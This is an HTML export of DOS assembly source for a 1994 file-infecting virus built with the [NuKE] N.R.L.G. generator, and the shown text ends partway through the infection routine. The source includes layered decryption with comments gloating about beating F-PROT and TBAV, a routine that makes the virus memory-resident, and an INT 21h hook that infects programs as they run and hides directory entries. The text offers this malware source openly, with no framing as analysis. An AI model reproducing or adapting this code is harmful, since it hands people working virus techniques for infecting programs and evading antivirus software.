<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³ THiS iS a [NuKE] RaNDoMiC LiFe GeNeRaToR ViRuS.        ³ [NuKE] PoWeR</span><span class="sc0">
</span><span class="sc1">;³ CReaTeD iS a N.R.L.G. PRoGRaM V0.66 BeTa TeST VeRSioN  ³ [NuKE] WaReZ</span><span class="sc0">
</span><span class="sc1">;³ auToR: aLL [NuKE] MeMeBeRS                             ³ [NuKE] PoWeR</span><span class="sc0">
</span><span class="sc1">;³ [NuKE] THe ReaL PoWeR!                                 ³ [NuKE] WaReZ</span><span class="sc0">
</span><span class="sc1">;³ NRLG WRiTTeR: AZRAEL (C) [NuKE] 1994                   ³ [NuKE] PoWeR</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0">    </span><span class="sc9">segment</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0">  </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">NEXT</span><span class="sc0"> 
 
</span><span class="sc5">NEXT</span><span class="sc4">:</span><span class="sc0">  
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">             </span><span class="sc1">;take the stack pointer location </span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;take the "DELTA HANDLE" for my virus       </span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">    </span><span class="sc1">;subtract the large code off this code </span><span class="sc0">
                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;*******************************************************************</span><span class="sc0">
</span><span class="sc1">;                      #1 DECRYPT ROUTINE                               </span><span class="sc0">
</span><span class="sc1">;*******************************************************************</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">crypt</span><span class="sc4">],</span><span class="sc2">0b9h</span><span class="sc0"> </span><span class="sc1">;is the first runnig?        </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">crypt2</span><span class="sc0">                    </span><span class="sc1">;yes! not decrypt              </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0">            </span><span class="sc1">;cx = large of virus               </span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc4">]+</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">    </span><span class="sc1">;di = first byte to decrypt          </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">;dx = value for decrypt          </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                                   </span><span class="sc0">
</span><span class="sc5">deci</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;deci = fuck label!                                    </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">

ÿ</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">07dh</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0d5h</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">035h</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">022h</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">034h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">012h</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0e8h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">08522h</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">058h</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
ÿ</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                                </span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bye</span><span class="sc0">                      </span><span class="sc1">;######## BYE BYE F-PROT ! ##########     </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">bye</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;#### HEY FRIDRIK! IS ONLY A JMP!!###      </span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------                               </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">                   </span><span class="sc1">;######### BYE BYE TBAV ! ##########     </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;### (CANGE INT AT YOU PLEASURE) ###        </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                   </span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">deci</span><span class="sc0">                    </span><span class="sc1">;repeat please!               </span><span class="sc0">
                             </span><span class="sc1">;           </span><span class="sc0">
</span><span class="sc1">;*****************************************************************</span><span class="sc0">
</span><span class="sc1">;                   #2 DECRYPT ROUTINE                                                    </span><span class="sc0">
</span><span class="sc1">;*****************************************************************</span><span class="sc0">
                              </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;fuck label!                  </span><span class="sc0">
                              </span><span class="sc1">;                </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0">             </span><span class="sc1">;cx = large of virus                 </span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypt2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">   </span><span class="sc1">;di = first byte to decrypt                  </span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------                                              </span><span class="sc0">
</span><span class="sc5">deci2</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;              </span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;decrytion rutine          </span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                        </span><span class="sc1">;very simple...            </span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">deci2</span><span class="sc0">                    </span><span class="sc1">;           </span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">crypt2</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;fuck label!          </span><span class="sc0">
                              </span><span class="sc1">;                  </span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0CACAH</span><span class="sc0">                 </span><span class="sc1">;call to my resident interrup mask                  </span><span class="sc0">
</span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">                       </span><span class="sc1">;for chek "I'm is residet?"   </span><span class="sc0">
</span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">Bh</span><span class="sc4">,</span><span class="sc2">0CAH</span><span class="sc0">                   </span><span class="sc1">;is equal to CACA?</span><span class="sc0">
</span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">PUM2</span><span class="sc0">                       </span><span class="sc1">;yes! jump to runnig program</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">action</span><span class="sc0">
</span><span class="sc1">;*****************************************************************</span><span class="sc0">
</span><span class="sc1">; NRLG FUNCTIONS  (SELECTABLE)</span><span class="sc0">
</span><span class="sc1">;*****************************************************************</span><span class="sc0">

ÿ</span><span class="sc1">;****************************************************************</span><span class="sc0">
</span><span class="sc1">;               PROCESS TO REMAIN RESIDENT                                                                  </span><span class="sc0">
</span><span class="sc1">;****************************************************************   </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">                  
</span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;store the int 21 vectors </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">int21</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">;in cs:int21</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">int21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;ax = my actual segment                             </span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;dec my segment for look my MCB</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;read the #3 byte of my MCB =total used memory</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                          </span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                           </span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc0">  </span><span class="sc1">;subtract the large of my virus </span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">17</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0">           </span><span class="sc1">;and 100H for the PSP total</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">                       </span><span class="sc1">;used memory</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                          </span><span class="sc1">;put the new value to MCB</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0">     
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                      </span><span class="sc1">;                              </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;request the memory to fuck DOS!                                                 </span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;ax=new segment </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;ax-1= new segment MCB </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;put '8' in the segment</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------                                </span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;es = new segment</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;si = start of virus </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                     </span><span class="sc1">;di = 100H (psp position) </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">       </span><span class="sc1">;cx = lag of virus</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;ds = cs</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">;mov the code</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;ds:si &gt;&gt; es:di</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">             </span><span class="sc1">;dx = new int21 handler</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;set the vectors </span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">pum2</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;  </span><span class="sc0">
                                    </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">real</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;restore the 3  </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">           </span><span class="sc1">;first bytes  </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">real</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">101h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;jmp to execute</span><span class="sc0">
                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************</span><span class="sc0">
</span><span class="sc1">;*             HANDLER FOR THE INT 21H                                       </span><span class="sc0">
</span><span class="sc1">;*****************************************************************</span><span class="sc0">
                          </span><span class="sc1">;          </span><span class="sc0">
</span><span class="sc5">VIRUS</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;  </span><span class="sc0">
                          </span><span class="sc1">;     </span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">                </span><span class="sc1">;is a 4b function? </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">REPRODUCCION</span><span class="sc0">           </span><span class="sc1">;yes! jump to reproduce !</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0">
</span><span class="sc5">dirsal</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0CACAH</span><span class="sc0">             </span><span class="sc1">;is ... a caca function? (resident chek)</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">a3</span><span class="sc0">                    </span><span class="sc1">;no! jump to a3</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">0cah</span><span class="sc0">               </span><span class="sc1">;yes! put ca in bh</span><span class="sc0">
</span><span class="sc5">a3</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">INT21</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;jmp to original int 21h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                       </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">make</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[NuKE] N.R.L.G. AZRAEL'</span><span class="sc0">
</span><span class="sc5">dir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dir_s</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">REPRODUCCION</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;       </span><span class="sc0">
                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">                      </span><span class="sc1">;put the register</span><span class="sc0">
</span><span class="sc6">pusha</span><span class="sc0">                      </span><span class="sc1">;in the stack</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                    </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524H</span><span class="sc0">               </span><span class="sc1">;get the dos error control                      </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">;interupt                        </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">      </span><span class="sc1">;and put in cs:error                      </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">;            </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524H</span><span class="sc0">               </span><span class="sc1">;change the dos error control                    </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">all</span><span class="sc0">          </span><span class="sc1">;for my "trap mask"                      </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">;         </span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
